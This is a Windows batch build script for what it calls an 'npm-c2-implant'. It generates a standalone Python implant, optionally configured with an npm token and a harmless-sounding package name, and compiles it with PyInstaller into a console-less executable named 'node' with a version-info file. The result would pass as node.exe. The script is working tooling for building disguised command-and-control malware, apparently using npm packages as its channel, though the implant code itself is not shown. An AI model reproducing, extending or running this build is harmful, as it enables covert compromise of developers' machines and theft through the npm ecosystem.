@echo off
setlocal

set PROJ=%~dp0
set NAME=npm-c2-implant
set GEN=%TEMP%\%NAME%.py

:: Optional: build.bat <token> <package>
::   build.bat npm_xxxx npx-telemetry-collector
set TOKEN=%~1
set PKG=%~2

echo [+] generating standalone implant...

if "%TOKEN%"=="" (
    python -m npm_c2 --generate-standalone > "%GEN%"
) else (
    if "%PKG%"=="" (
        echo [-] usage: build.bat ^<token^> ^<package^>
        exit /b 1
    )
    python -m npm_c2 --generate-standalone -t "%TOKEN%" -p "%PKG%" > "%GEN%"
)

:: stderr must stay out of the generated file: a traceback would otherwise be
:: compiled into node.exe and shipped as a "successful" build.
if %ERRORLEVEL% neq 0 (
    echo [-] failed to generate standalone
    del "%GEN%" 2>nul
    exit /b 1
)

python -c "import ast,sys; ast.parse(open(sys.argv[1],encoding='utf-8').read())" "%GEN%"
if %ERRORLEVEL% neq 0 (
    echo [-] generated implant does not parse; refusing to build
    exit /b 1
)

where pyinstaller >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo [-] pyinstaller not found. install with: pip install pyinstaller
    exit /b 1
)

echo [+] compiling to exe...
pyinstaller --onefile --noconsole --name node ^
    --distpath "%PROJ%dist" ^
    --workpath "%PROJ%build" ^
    --specpath "%PROJ%build" ^
    --version-file "%PROJ%version.txt" ^
    "%GEN%" 2>&1

if %ERRORLEVEL% equ 0 (
    echo [+] build complete: %PROJ%dist\node.exe
    del "%GEN%" 2>nul
    rmdir /s /q "%PROJ%build" 2>nul
    rmdir /s /q "%PROJ%__pycache__" 2>nul
) else (
    echo [-] build failed
    exit /b 1
)
